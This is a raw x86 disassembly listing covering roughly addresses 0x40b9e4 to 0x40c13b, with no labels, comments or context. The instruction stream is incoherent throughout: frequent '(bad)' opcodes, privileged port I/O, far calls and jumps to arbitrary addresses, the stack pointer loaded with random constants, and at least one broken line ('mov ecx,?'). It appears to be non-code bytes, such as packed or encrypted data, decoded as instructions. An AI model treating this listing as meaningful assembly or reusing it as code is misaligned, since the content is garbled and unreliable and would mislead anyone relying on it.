  40b9e4:	fidivr DWORD PTR [edx]
  40b9e6:	loop   0x40b9b1
  40b9e8:	and    ebx,ecx
  40b9ea:	mov    esp,0xe8795e46
  40b9ef:	dec    edi
  40b9f0:	push   ds
  40b9f1:	scas   eax,DWORD PTR es:[edi]
  40b9f2:	sub    DWORD PTR [edx+0x708699bb],0xffffff92
  40b9f9:	cmp    DWORD PTR [esi+esi*1+0x1e],esp
  40b9fd:	repz cmp DWORD PTR [ebx+0x3b3ed002],ebp
  40ba04:	or     ah,cl
  40ba06:	idiv   edx
  40ba08:	test   dl,bh
  40ba0a:	add    DWORD PTR [ebx+0x7b],eax
  40ba0d:	icebp  
  40ba0e:	push   eax
  40ba0f:	push   eax
  40ba10:	or     WORD PTR [eax+esi*1-0x3645d55],si
  40ba18:	adc    eax,0x93060ad2
  40ba1d:	xchg   esi,eax
  40ba1e:	fwait
  40ba1f:	inc    esi
  40ba20:	lea    esi,ds:0xf6043622
  40ba26:	mov    esi,ebx
  40ba28:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ba29:	sar    esi,0xde
  40ba2c:	enter  0xf71a,0xbc
  40ba30:	lock pop edi
  40ba32:	or     al,0xf
  40ba34:	fmul   DWORD PTR [edx+0x1e]
  40ba37:	push   0x95704c7c
  40ba3c:	push   ebp
  40ba3d:	cmp    ecx,esp
  40ba3f:	mov    DWORD PTR [edx+0x3c2aec43],edi
  40ba45:	bound  eax,QWORD PTR [edx+0x7e235b7]
  40ba4b:	mov    al,ds:0x9d4df54a
  40ba50:	fwait
  40ba51:	mov    esp,0x2e499e43
  40ba56:	lods   al,BYTE PTR ds:[esi]
  40ba57:	inc    ebp
  40ba58:	ja     0x40ba73
  40ba5a:	and    al,0xa7
  40ba5c:	mov    ds:0xfafbee9e,eax
  40ba61:	fistp  DWORD PTR [ebx-0x40]
  40ba64:	jecxz  0x40bac1
  40ba66:	or     edi,DWORD PTR cs:[eax-0x77]
  40ba6a:	push   esi
  40ba6b:	and    eax,0xcad704dc
  40ba70:	adc    eax,DWORD PTR [ebx+0x46]
  40ba73:	fmul   st,st(4)
  40ba75:	and    BYTE PTR [edi],0x46
  40ba78:	push   edx
  40ba79:	icebp  
  40ba7a:	ret    0xbb3f
  40ba7d:	stos   BYTE PTR es:[edi],al
  40ba7e:	das    
  40ba7f:	push   ebp
  40ba80:	pushf  
  40ba81:	clc    
  40ba82:	dec    ecx
  40ba83:	pop    es
  40ba84:	xchg   esi,eax
  40ba85:	ds xchg edx,eax
  40ba87:	jg     0x40ba43
  40ba89:	out    dx,al
  40ba8a:	or     eax,0x79868cea
  40ba8f:	inc    bp
  40ba91:	fsubr  DWORD PTR [ebx-0x366c87c2]
  40ba97:	jne    0x40ba25
  40ba99:	and    DWORD PTR [eax-0x25f7b523],ebp
  40ba9f:	pop    es
  40baa0:	mov    esp,DWORD PTR [ebx]
  40baa2:	(bad)  
  40baa3:	pop    ebp
  40baa4:	adc    al,0xcc
  40baa6:	mov    ds:0xb786f123,al
  40baab:	xor    eax,0x9d973186
  40bab0:	pop    eax
  40bab1:	retf   
  40bab2:	xchg   cl,bl
  40bab4:	xchg   ebx,eax
  40bab5:	aam    0x44
  40bab7:	sub    ah,ch
  40bab9:	dec    eax
  40baba:	pusha  
  40babb:	cmp    al,0x63
  40babd:	adc    eax,0x2ee1f539
  40bac2:	mov    ecx,0xfc19609d
  40bac7:	(bad)  
  40bac8:	idiv   BYTE PTR [esi+0x45]
  40bacb:	xchg   esp,eax
  40bacc:	(bad)  
  40bacd:	div    DWORD PTR [ecx]
  40bacf:	(bad)  
  40bad0:	pop    esi
  40bad1:	push   ds
  40bad2:	xor    al,0x16
  40bad4:	jle    0x40ba70
  40bad6:	scas   eax,DWORD PTR es:[edi]
  40bad7:	push   0x4e7727f8
  40badc:	and    BYTE PTR [edi],al
  40bade:	imul   ebx,DWORD PTR [ecx+0x65],0x62
  40bae2:	sub    BYTE PTR [eax+0x66],dh
  40bae5:	mov    fs,WORD PTR [ebx]
  40bae7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bae8:	add    al,0x46
  40baea:	mov    dl,0x38
  40baec:	jno    0x40bae3
  40baee:	cmp    DWORD PTR [eax+0x224f658e],0x21
  40baf5:	push   esi
  40baf6:	pop    esp
  40baf7:	fs scas al,BYTE PTR es:[edi]
  40baf9:	cmp    DWORD PTR [eax],0xffffffb5
  40bafc:	test   DWORD PTR [edx+0x1cef6d3e],ebx
  40bb02:	mov    bh,0x1f
  40bb04:	bound  edi,QWORD PTR [ebp-0x12e5c129]
  40bb0a:	mov    edi,0xe0c2edb3
  40bb0f:	xchg   edi,eax
  40bb10:	es xor eax,0x5e112ba5
  40bb16:	lds    ebp,FWORD PTR [esi]
  40bb18:	add    al,0xa5
  40bb1a:	nop
  40bb1b:	mov    BYTE PTR [esi],dh
  40bb1d:	mov    ch,0x4c
  40bb1f:	jbe    0x40bac7
  40bb21:	mov    esp,0xac8dd28e
  40bb26:	mov    bh,0xb6
  40bb28:	ss jnp 0x40bb3e
  40bb2b:	adc    ecx,ebp
  40bb2d:	cmp    ah,BYTE PTR [edx+0x9974b99]
  40bb33:	push   cs
  40bb34:	sbb    eax,0x5ad29db4
  40bb39:	add    dl,al
  40bb3b:	out    0x35,eax
  40bb3d:	shl    DWORD PTR [edi-0x5c],0x67
  40bb41:	add    eax,0x858bab97
  40bb46:	sahf   
  40bb47:	mov    dh,0xb5
  40bb49:	cmp    eax,0xabd1874d
  40bb4e:	dec    esp
  40bb4f:	pusha  
  40bb50:	cmp    al,0x4a
  40bb52:	sbb    BYTE PTR [ebp+0xa],dl
  40bb55:	lds    eax,FWORD PTR [eax]
  40bb57:	gs dec ebp
  40bb59:	dec    esi
  40bb5a:	std    
  40bb5b:	or     esi,DWORD PTR [edx+ecx*1]
  40bb5e:	das    
  40bb5f:	xchg   edx,eax
  40bb60:	imul   DWORD PTR [edx-0x44]
  40bb63:	nop
  40bb64:	(bad)  
  40bb65:	sub    BYTE PTR cs:[edi-0x511471f8],bl
  40bb6c:	(bad)  
  40bb6d:	les    esp,FWORD PTR [ebp+0x3c]
  40bb70:	out    0xa3,eax
  40bb72:	outs   dx,BYTE PTR ds:[esi]
  40bb73:	add    BYTE PTR [edi],0x97
  40bb76:	outs   dx,BYTE PTR ds:[esi]
  40bb77:	lods   al,BYTE PTR ds:[esi]
  40bb78:	pop    ebx
  40bb79:	push   0x77
  40bb7b:	mov    eax,ds:0xcf9fa0f8
  40bb80:	stos   DWORD PTR es:[edi],eax
  40bb81:	adc    DWORD PTR [eax+0x1d46cb66],0x43
  40bb88:	test   DWORD PTR [ebp+0xb0a6930],0x8b631ccb
  40bb92:	mov    cl,0xc9
  40bb94:	sbb    BYTE PTR [ecx],ch
  40bb96:	inc    esp
  40bb97:	xchg   BYTE PTR [ebp+0x6160eb8e],ch
  40bb9d:	or     eax,0x1700d71c
  40bba2:	out    0x2f,eax
  40bba4:	pusha  
  40bba5:	das    
  40bba6:	push   ss
  40bba7:	in     al,0x87
  40bba9:	and    DWORD PTR [eax],0xc5428a5e
  40bbaf:	int    0x2e
  40bbb1:	(bad)  
  40bbb2:	sub    ebp,ecx
  40bbb4:	repnz stc 
  40bbb6:	inc    edi
  40bbb7:	pusha  
  40bbb8:	rcr    DWORD PTR [esi],1
  40bbba:	mov    ds:0xe1ba0625,al
  40bbbf:	xchg   DWORD PTR [eax-0x6e],esp
  40bbc2:	in     eax,dx
  40bbc3:	sub    cl,BYTE PTR [ebx-0x67bc43ac]
  40bbc9:	imul   ebp,DWORD PTR [eax+0x3],0x77
  40bbcd:	popf   
  40bbce:	xchg   ebp,eax
  40bbcf:	or     ah,cl
  40bbd1:	jg     0x40bbed
  40bbd3:	dec    eax
  40bbd4:	test   BYTE PTR [edi-0x74c8b900],dl
  40bbda:	inc    ecx
  40bbdb:	repz jo 0x40bc0d
  40bbde:	cmp    edi,DWORD PTR [ebx-0x31]
  40bbe1:	mov    DWORD PTR [esi-0x75],ecx
  40bbe4:	jne    0x40bb85
  40bbe6:	add    ah,BYTE PTR ds:0x6dde771b
  40bbec:	mov    esp,0x9efa4d6b
  40bbf1:	xchg   ecx,eax
  40bbf2:	inc    ebp
  40bbf3:	lock ja 0x40bc50
  40bbf6:	outs   dx,BYTE PTR ds:[esi]
  40bbf7:	mov    dl,0xb7
  40bbf9:	sar    BYTE PTR [eax-0x60],0x32
  40bbfd:	pop    ecx
  40bbfe:	icebp  
  40bbff:	xchg   edi,eax
  40bc00:	mov    ah,0x14
  40bc02:	xchg   ebp,eax
  40bc03:	and    BYTE PTR [edi+0xb77afef],dl
  40bc09:	ins    BYTE PTR es:[edi],dx
  40bc0a:	push   esp
  40bc0b:	gs pop esi
  40bc0d:	cmp    eax,0x37748e8c
  40bc12:	xchg   edx,eax
  40bc13:	inc    edi
  40bc14:	cmp    DWORD PTR [ecx+0x51],eax
  40bc17:	mov    ecx,?
  40bc19:	adc    eax,0x8040c4fa
  40bc1e:	sub    eax,0x1f24a471
  40bc23:	mov    cl,al
  40bc25:	aaa    
  40bc26:	xlat   BYTE PTR ds:[ebx]
  40bc27:	pop    esp
  40bc28:	mov    edi,0x765dd594
  40bc2d:	(bad)  
  40bc2e:	das    
  40bc2f:	sub    eax,0xa14619cb
  40bc34:	dec    edi
  40bc35:	adc    DWORD PTR [eax+0x54f2b871],ebx
  40bc3b:	jecxz  0x40bc0f
  40bc3d:	xchg   ebx,eax
  40bc3e:	sar    ebx,0x84
  40bc41:	push   esp
  40bc42:	ret    0xdd4a
  40bc45:	or     ch,bh
  40bc47:	pushf  
  40bc48:	cld    
  40bc49:	xor    eax,0xa26fb9e9
  40bc4e:	mov    ds:0xaad5a89e,al
  40bc53:	push   eax
  40bc54:	aam    0x1f
  40bc56:	fldcw  WORD PTR [edi+0x559c936]
  40bc5c:	mov    edi,DWORD PTR ds:0x160a0a76
  40bc62:	sbb    eax,0xf385bf3f
  40bc67:	sbb    ebp,esp
  40bc69:	and    esi,eax
  40bc6b:	inc    edi
  40bc6c:	js     0x40bc91
  40bc6e:	or     dh,BYTE PTR [ecx]
  40bc70:	repz stc 
  40bc72:	push   cs
  40bc73:	adc    al,0x64
  40bc75:	js     0x40bc9e
  40bc77:	stos   DWORD PTR es:[edi],eax
  40bc78:	push   edx
  40bc79:	jp     0x40bcf2
  40bc7b:	sbb    eax,0x1f332296
  40bc80:	pop    eax
  40bc81:	(bad)  
  40bc82:	push   edx
  40bc83:	(bad)  
  40bc85:	xor    al,0x92
  40bc87:	sar    DWORD PTR [edx+0x1205286c],0xbb
  40bc8e:	xchg   BYTE PTR [esi],ah
  40bc90:	pop    ss
  40bc91:	sbb    edi,ecx
  40bc93:	in     al,dx
  40bc94:	shr    BYTE PTR [edx-0x451e3eca],cl
  40bc9a:	xchg   esp,eax
  40bc9b:	mov    bl,0x3c
  40bc9d:	xor    edi,esp
  40bc9f:	adc    bl,dh
  40bca1:	inc    edi
  40bca2:	sbb    DWORD PTR [edx],0xee77b09b
  40bca8:	jbe    0x40bc7a
  40bcaa:	out    0xf,al
  40bcac:	aaa    
  40bcad:	outs   dx,BYTE PTR ds:[esi]
  40bcae:	test   DWORD PTR [ecx+0x1e],eax
  40bcb1:	loop   0x40bc62
  40bcb3:	xor    cl,BYTE PTR [edi]
  40bcb5:	es mov dl,0xbb
  40bcb8:	rcr    dl,cl
  40bcba:	or     edx,DWORD PTR [eax-0x30]
  40bcbd:	mov    edx,0x67ce66e5
  40bcc2:	add    DWORD PTR [edx-0x5b4ca946],eax
  40bcc8:	xchg   ebx,eax
  40bcc9:	jmp    0x40bd19
  40bccb:	call   0x75a4:0x7d60662f
  40bcd2:	mov    edi,0x76d5c187
  40bcd7:	jmp    0x40bd51
  40bcd9:	pushf  
  40bcda:	sub    edi,ebp
  40bcdc:	add    ecx,DWORD PTR [eax]
  40bcde:	add    eax,0x7b667b00
  40bce3:	jne    0x40bcb1
  40bce5:	int3   
  40bce6:	cmp    esi,edx
  40bce8:	mov    esi,0x1709f0c5
  40bced:	inc    esp
  40bcee:	pop    edx
  40bcef:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bcf0:	xchg   esp,eax
  40bcf1:	popf   
  40bcf2:	mov    ch,0x38
  40bcf4:	int3   
  40bcf5:	call   0x916cd93f
  40bcfa:	test   eax,ebp
  40bcfc:	cmp    BYTE PTR [ebp-0x711340d],ah
  40bd02:	movs   DWORD PTR es:[di],DWORD PTR ds:[si]
  40bd04:	or     BYTE PTR [edi+0x1279008d],al
  40bd0a:	adc    BYTE PTR [ebx+ecx*4+0x22],0x2b
  40bd0f:	mov    al,ds:0x2e82f8a3
  40bd14:	pop    esp
  40bd15:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bd16:	shl    BYTE PTR [edx],cl
  40bd18:	es sub eax,0xed1f4d5b
  40bd1e:	inc    ecx
  40bd1f:	mov    al,0x2b
  40bd21:	lock cdq 
  40bd23:	mov    es,WORD PTR [ebp+0x63]
  40bd26:	push   ecx
  40bd27:	mov    ch,0x29
  40bd29:	rcr    DWORD PTR [ebx+0x29],0x6a
  40bd2d:	retf   
  40bd2e:	in     al,dx
  40bd2f:	je     0x40bcfb
  40bd31:	lock or eax,0xcce368ae
  40bd37:	jne    0x40bd12
  40bd39:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bd3a:	clc    
  40bd3b:	popf   
  40bd3c:	push   edx
  40bd3d:	xchg   ecx,eax
  40bd3e:	and    eax,ebx
  40bd40:	mov    ah,0x7a
  40bd42:	gs xchg ecx,eax
  40bd44:	nop    DWORD PTR ds:0xf03dd3a9
  40bd4b:	call   0xd113eec3
  40bd50:	sub    edi,ebp
  40bd52:	loopne 0x40bcf7
  40bd54:	jmp    0xfc711c3f
  40bd59:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bd5a:	mov    dh,0x5f
  40bd5c:	pop    edx
  40bd5d:	inc    edx
  40bd5e:	dec    ecx
  40bd5f:	xchg   edx,eax
  40bd60:	and    al,0x29
  40bd62:	adc    eax,DWORD PTR [ecx+0x135e70bf]
  40bd68:	pavgw  mm1,QWORD PTR [edx]
  40bd6b:	jge    0x40bdbb
  40bd6d:	and    al,0x40
  40bd6f:	sub    al,0x44
  40bd71:	pop    es
  40bd72:	pop    DWORD PTR [ebp-0x6a0cd0e9]
  40bd78:	retf   0x5762
  40bd7b:	sbb    ecx,esi
  40bd7d:	lds    esp,FWORD PTR [edx]
  40bd7f:	rcr    esp,cl
  40bd81:	mov    ah,0x45
  40bd83:	add    BYTE PTR [ebx-0x25],ch
  40bd86:	(bad)  
  40bd87:	or     al,BYTE PTR [ebp+edi*8-0x3d]
  40bd8b:	and    bh,cl
  40bd8d:	adc    edx,esp
  40bd8f:	mov    esp,0x57fbd36e
  40bd94:	or     eax,0x9a64a85e
  40bd99:	rcr    DWORD PTR [edi],cl
  40bd9b:	aad    0x96
  40bd9d:	push   0x46
  40bd9f:	mov    ebp,0x3cf39616
  40bda4:	ins    DWORD PTR es:[edi],dx
  40bda5:	xlat   BYTE PTR ds:[ebx]
  40bda7:	out    dx,eax
  40bda8:	fcomp  DWORD PTR ds:0x49125d72
  40bdae:	xor    ch,dl
  40bdb0:	push   edx
  40bdb1:	(bad)  
  40bdb2:	and    al,0xbb
  40bdb4:	fsubp  st(4),st
  40bdb6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bdb7:	jne    0x40bdaa
  40bdb9:	sbb    dl,BYTE PTR [ebx+0x7a4ffd57]
  40bdbf:	test   eax,0xc13eff4a
  40bdc4:	jp     0x40bd5f
  40bdc6:	ins    DWORD PTR es:[edi],dx
  40bdc7:	xor    eax,ecx
  40bdc9:	mov    es,edi
  40bdcb:	fucom  st(1)
  40bdcd:	push   esi
  40bdce:	outs   dx,DWORD PTR ds:[esi]
  40bdcf:	stos   BYTE PTR es:[edi],al
  40bdd0:	neg    DWORD PTR [ecx+0x138a688b]
  40bdd6:	and    eax,0x64c01891
  40bddb:	pop    esi
  40bddc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bddd:	shr    al,1
  40bddf:	das    
  40bde0:	js     0x40bd7c
  40bde2:	popa   
  40bde3:	fucomip st,st(2)
  40bde5:	and    eax,0xedf40eaa
  40bdea:	mov    ch,0xdf
  40bdec:	(bad)  
  40bded:	xchg   ecx,eax
  40bdee:	mov    al,BYTE PTR [esi+eax*4]
  40bdf1:	(bad)  
  40bdf2:	fisttp QWORD PTR [eax]
  40bdf4:	fnsave [eax]
  40bdf6:	outs   dx,BYTE PTR ds:[esi]
  40bdf7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bdf8:	addr16 sbb al,0x54
  40bdfb:	popf   
  40bdfc:	sub    eax,0xc085743e
  40be01:	mov    cs,WORD PTR [edx+0x42]
  40be04:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40be05:	jo     0x40bd9a
  40be07:	mov    ah,0x5b
  40be09:	repz mov dh,0x49
  40be0c:	loopne 0x40bddb
  40be0e:	mov    cl,0x47
  40be10:	add    ah,BYTE PTR [esi-0xdda38f0]
  40be16:	aas    
  40be17:	mov    es,ebx
  40be19:	scas   al,BYTE PTR es:[edi]
  40be1a:	pop    esp
  40be1b:	ret    
  40be1c:	cmp    esp,DWORD PTR [esi+0x57deb1c]
  40be22:	mov    esi,0xa3b1c5b3
  40be27:	xor    eax,0x2f9dd4f0
  40be2c:	repnz loopne 0x40bdfd
  40be2f:	pushf  
  40be30:	icebp  
  40be31:	lock xor BYTE PTR [edx-0x2d],cl
  40be35:	and    eax,0xee3d7c4
  40be3a:	and    edi,DWORD PTR [ebx-0x19]
  40be3d:	and    eax,0xa2970a26
  40be42:	es cs in eax,0xd3
  40be46:	shl    DWORD PTR [edx-0x22],1
  40be49:	pushf  
  40be4a:	test   al,0x2d
  40be4c:	daa    
  40be4d:	ror    BYTE PTR [edx],0x6
  40be50:	in     eax,dx
  40be51:	out    dx,al
  40be52:	fwait
  40be53:	outs   dx,BYTE PTR gs:[esi]
  40be55:	pop    esp
  40be56:	popf   
  40be57:	(bad)  
  40be58:	fld    TBYTE PTR [esi]
  40be5a:	mov    bh,0xf6
  40be5c:	jmp    0x814d4315
  40be61:	cdq    
  40be62:	rcl    BYTE PTR [ebx+0x48fc31db],1
  40be68:	cmc    
  40be69:	sub    ecx,DWORD PTR [edi+0x5dea859c]
  40be6f:	test   eax,0xf5d4b145
  40be74:	add    al,0xbd
  40be76:	test   eax,0xf51cde60
  40be7b:	xchg   edx,eax
  40be7c:	ret    
  40be7d:	jmp    0xdee6:0x290b6fc5
  40be84:	push   DWORD PTR [ebp+0x20]
  40be87:	scas   al,BYTE PTR es:[edi]
  40be88:	stos   BYTE PTR es:[edi],al
  40be89:	aam    0x65
  40be8b:	jo     0x40be23
  40be8d:	rcr    BYTE PTR [eax],0x84
  40be90:	gs inc esp
  40be92:	add    eax,0xfc845fd
  40be97:	xor    edi,0xd5e02403
  40be9d:	out    dx,eax
  40be9e:	or     dl,ah
  40bea0:	sbb    esi,DWORD PTR [ebx-0x68]
  40bea3:	add    eax,0x30ce3359
  40bea8:	mov    BYTE PTR [ebx+0x4b3266b],dl
  40beae:	in     al,dx
  40beaf:	dec    edx
  40beb0:	push   ss
  40beb1:	mov    ebp,0x17ef4654
  40beb6:	and    ah,dl
  40beb8:	cdq    
  40beb9:	pushf  
  40beba:	out    dx,al
  40bebb:	inc    edx
  40bebc:	(bad)  
  40bebd:	pop    ebx
  40bebe:	xor    DWORD PTR [ebx+0x23767b39],esi
  40bec4:	out    dx,al
  40bec5:	sbb    DWORD PTR [esi+0x7c],esp
  40bec8:	loopne 0x40be8e
  40beca:	inc    ecx
  40becb:	sbb    al,0x5f
  40becd:	add    dh,BYTE PTR [ecx-0x28]
  40bed0:	ss add eax,0x56293809
  40bed6:	mov    esp,0x21da60c6
  40bedb:	inc    ebx
  40bedc:	and    al,0x73
  40bede:	jecxz  0x40be8c
  40bee0:	dec    esp
  40bee1:	and    al,0x26
  40bee3:	push   edi
  40bee4:	push   ebx
  40bee5:	xor    DWORD PTR [esp+ecx*2],edi
  40bee8:	daa    
  40bee9:	cmp    ecx,DWORD PTR [ebp+ebx*8-0xc]
  40beed:	call   0xc052f0a4
  40bef2:	int3   
  40bef3:	pop    edx
  40bef4:	in     al,dx
  40bef5:	push   edi
  40bef6:	jb     0x40bef6
  40bef8:	sbb    bh,BYTE PTR [eax+0x3e]
  40befb:	push   eax
  40befc:	nop
  40befd:	iret   
  40befe:	or     bh,al
  40bf00:	lods   eax,DWORD PTR ds:[esi]
  40bf01:	pop    ebp
  40bf02:	sub    ecx,esp
  40bf04:	and    DWORD PTR [edx+edx*4-0x398ace74],edx
  40bf0b:	mov    ah,0x49
  40bf0d:	es mov ebx,0x71e9c4be
  40bf13:	pop    ecx
  40bf14:	mov    BYTE PTR [ebx+0xe],dl
  40bf17:	and    al,0x6b
  40bf19:	aas    
  40bf1a:	sbb    eax,0x26d02cd3
  40bf1f:	leave  
  40bf20:	xchg   ebp,eax
  40bf21:	push   ebp
  40bf22:	int    0xdc
  40bf24:	sbb    BYTE PTR [esi+0x60],ah
  40bf27:	xchg   esi,eax
  40bf28:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bf29:	std    
  40bf2a:	sahf   
  40bf2b:	daa    
  40bf2c:	push   ds
  40bf2d:	inc    edx
  40bf2e:	mov    DWORD PTR [edx+ecx*8-0x6b],esp
  40bf32:	xchg   esi,eax
  40bf33:	pop    ss
  40bf34:	dec    esi
  40bf35:	rol    BYTE PTR [eax+edx*8],cl
  40bf38:	test   eax,0xf92bd063
  40bf3d:	in     eax,dx
  40bf3e:	dec    ecx
  40bf3f:	int3   
  40bf40:	rcr    DWORD PTR [ebx+0x2cd4a442],1
  40bf46:	loope  0x40bee0
  40bf48:	push   ebp
  40bf49:	cmp    edx,edx
  40bf4b:	stos   DWORD PTR es:[edi],eax
  40bf4c:	pop    ebp
  40bf4d:	pusha  
  40bf4e:	adc    BYTE PTR [edi-0x77],bh
  40bf51:	cmp    ebx,DWORD PTR [edx+0x22e8f28a]
  40bf57:	mov    cl,0x0
  40bf59:	enter  0x4986,0xca
  40bf5d:	and    esp,ebx
  40bf5f:	xor    DWORD PTR [ecx-0x6b7b84b8],esi
  40bf65:	jg     0x40bf76
  40bf67:	dec    esp
  40bf68:	inc    DWORD PTR [ebx]
  40bf6a:	mov    ecx,0x7c9730bd
  40bf6f:	fs adc eax,0x168e171b
  40bf75:	ror    BYTE PTR [ecx+ebp*8-0x24169d1e],0x93
  40bf7d:	lods   al,BYTE PTR ds:[esi]
  40bf7e:	mov    esi,0xe7ffec03
  40bf83:	shl    ebx,1
  40bf85:	or     eax,DWORD PTR [eax+0x22]
  40bf88:	in     al,dx
  40bf89:	mov    ah,0x23
  40bf8b:	lock mov ch,0xf3
  40bf8e:	xchg   esi,eax
  40bf8f:	fsubrp st(4),st
  40bf91:	(bad)  
  40bf92:	idiv   BYTE PTR [ebx]
  40bf94:	ins    DWORD PTR es:[edi],dx
  40bf95:	ss hlt 
  40bf97:	push   esp
  40bf98:	push   0xe28e9ed4
  40bf9d:	not    DWORD PTR [ebp-0x27]
  40bfa0:	repz test eax,0xd9dba672
  40bfa6:	scas   eax,DWORD PTR es:[edi]
  40bfa7:	aad    0x12
  40bfa9:	add    eax,0x2aef2e97
  40bfae:	popf   
  40bfaf:	ja     0x40c01e
  40bfb1:	cli    
  40bfb2:	xor    eax,0x9452c1a2
  40bfb7:	mov    ebx,0xb4a31ca8
  40bfbc:	mov    al,BYTE PTR [edi]
  40bfbe:	mov    ds:0xa0eaa372,al
  40bfc3:	scas   ax,WORD PTR es:[edi]
  40bfc5:	fwait
  40bfc6:	shl    DWORD PTR [esi+edx*4-0x1d],cl
  40bfca:	sbb    esp,ebx
  40bfcc:	test   eax,0xa7e1784e
  40bfd1:	imul   edx,ecx,0x1e
  40bfd4:	ins    BYTE PTR es:[edi],dx
  40bfd5:	cmc    
  40bfd6:	jmp    0xe63401a4
  40bfdb:	pop    eax
  40bfdc:	xchg   ebx,eax
  40bfdd:	mov    WORD PTR [ebx],gs
  40bfdf:	jle    0x40bfd5
  40bfe1:	sub    eax,0x4826efce
  40bfe6:	(bad)  [edi+0x36]
  40bfe9:	pop    eax
  40bfea:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bfeb:	mov    ch,0x9b
  40bfed:	(bad)  
  40bfee:	ins    DWORD PTR es:[edi],dx
  40bfef:	cli    
  40bff0:	pop    ecx
  40bff1:	(bad)  
  40bff2:	xor    esi,DWORD PTR [ebx+0x26]
  40bff5:	mov    ds:0x12d55add,eax
  40bffa:	mov    esp,DWORD PTR [ebx-0x4a]
  40bffd:	mov    cl,0x2b
  40bfff:	test   eax,0xe0d49e7
  40c004:	loope  0x40bffe
  40c006:	and    eax,0x10d5837f
  40c00b:	jns    0x40bff3
  40c00d:	idiv   DWORD PTR [ebx-0x1ae2e367]
  40c013:	xor    eax,0xbce47ca4
  40c018:	aaa    
  40c019:	pop    ebx
  40c01a:	lahf   
  40c01b:	add    al,0x84
  40c01d:	mov    al,ds:0x42dd0d5f
  40c022:	inc    esp
  40c023:	fwait
  40c024:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c025:	and    DWORD PTR [edi+ecx*8+0x6a787e93],edx
  40c02c:	inc    edi
  40c02d:	jo     0x40c055
  40c02f:	outs   dx,DWORD PTR ds:[esi]
  40c030:	push   cs
  40c031:	cwde   
  40c032:	xchg   esp,eax
  40c033:	hlt    
  40c034:	fmul   QWORD PTR [esi-0x6e]
  40c037:	jecxz  0x40c07e
  40c039:	gs inc edi
  40c03b:	aad    0x5a
  40c03d:	inc    esi
  40c03e:	in     eax,0x39
  40c040:	cmp    al,0xaf
  40c042:	inc    edi
  40c043:	mov    bh,0x6c
  40c045:	ins    BYTE PTR es:[edi],dx
  40c046:	add    BYTE PTR [edx+0x3b7f7c38],bh
  40c04c:	sub    dh,BYTE PTR ds:0x4381fbc5
  40c052:	sub    BYTE PTR [ebx],al
  40c054:	inc    edi
  40c055:	scas   al,BYTE PTR es:[edi]
  40c056:	jb     0x40c002
  40c058:	sub    DWORD PTR [esi-0x3a],0xffffff91
  40c05c:	mov    eax,ds:0x437c845
  40c061:	or     ebx,ecx
  40c063:	imul   ebx,DWORD PTR [edx-0x28],0xbb6b9e49
  40c06a:	je     0x40c08d
  40c06c:	cld    
  40c06d:	push   es
  40c06e:	inc    esp
  40c06f:	sbb    BYTE PTR [esi+0x1f],ch
  40c072:	call   0x7892:0x79a50782
  40c079:	lods   eax,DWORD PTR ds:[esi]
  40c07a:	(bad)  
  40c07b:	rol    edi,1
  40c07d:	hlt    
  40c07e:	mov    edx,DWORD PTR [eax-0x30]
  40c081:	imul   esi,ebp,0xd1dede7c
  40c087:	test   eax,0x8d5fb412
  40c08c:	int    0xe7
  40c08e:	sbb    BYTE PTR [edx],0x9c
  40c091:	out    0xdc,eax
  40c093:	sbb    eax,0xc105ab58
  40c098:	jp     0x40c108
  40c09a:	cmp    eax,0x91b7d779
  40c09f:	or     ecx,ecx
  40c0a1:	hlt    
  40c0a2:	ins    DWORD PTR es:[edi],dx
  40c0a3:	outs   dx,DWORD PTR ds:[esi]
  40c0a4:	lods   eax,DWORD PTR ds:[esi]
  40c0a5:	xchg   edx,eax
  40c0a6:	out    0x73,al
  40c0a8:	adc    eax,0x87ccc61c
  40c0ad:	cmc    
  40c0ae:	arpl   WORD PTR [edi],cx
  40c0b0:	aas    
  40c0b1:	mov    bh,0x8d
  40c0b3:	or     eax,0x5de1eb1b
  40c0b8:	dec    ebx
  40c0b9:	jl     0x40c12c
  40c0bb:	xor    al,0x43
  40c0bd:	pop    ecx
  40c0be:	sbb    ebp,DWORD PTR [ecx+0x2304b777]
  40c0c4:	stc    
  40c0c5:	stos   BYTE PTR es:[edi],al
  40c0c6:	push   esp
  40c0c7:	sbb    al,0x4a
  40c0c9:	mov    ebp,0x191f1549
  40c0ce:	pop    ss
  40c0cf:	mov    al,ds:0x258a1e21
  40c0d4:	popa   
  40c0d5:	call   0x5c49ef6d
  40c0da:	jne    0x40c155
  40c0dc:	dec    ebp
  40c0dd:	inc    ebx
  40c0de:	push   esi
  40c0df:	jecxz  0x40c068
  40c0e1:	mov    edx,0x583ba542
  40c0e6:	jg     0x40c15c
  40c0e8:	xchg   BYTE PTR [edx-0x47a508eb],bh
  40c0ee:	cmc    
  40c0ef:	mov    bl,0x40
  40c0f1:	(bad)  
  40c0f2:	mov    dl,0x21
  40c0f4:	loop   0x40c165
  40c0f6:	push   ds
  40c0f7:	mov    ebp,0x8c011fdc
  40c0fc:	add    BYTE PTR [ecx+ecx*4-0x9e9e34b],0x47
  40c104:	rcl    edx,0x7e
  40c107:	adc    DWORD PTR [eax],esp
  40c109:	fimul  DWORD PTR [edx+0x1a38e56d]
  40c10f:	aaa    
  40c110:	sbb    ax,0xb8c9
  40c114:	js     0x40c182
  40c116:	pop    edx
  40c117:	aaa    
  40c118:	jle    0x40c0a8
  40c11a:	or     eax,0xb316aa9e
  40c11f:	cmp    al,0x89
  40c121:	push   ecx
  40c122:	add    eax,0xf568f66
  40c127:	mov    esi,ds
  40c129:	adc    cl,0x40
  40c12c:	xchg   DWORD PTR [ecx],ebx
  40c12e:	mov    edx,0x56ecf415
  40c133:	add    DWORD PTR [edi],edx
  40c135:	mov    bl,BYTE PTR [ecx-0x341109b1]
  40c13b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
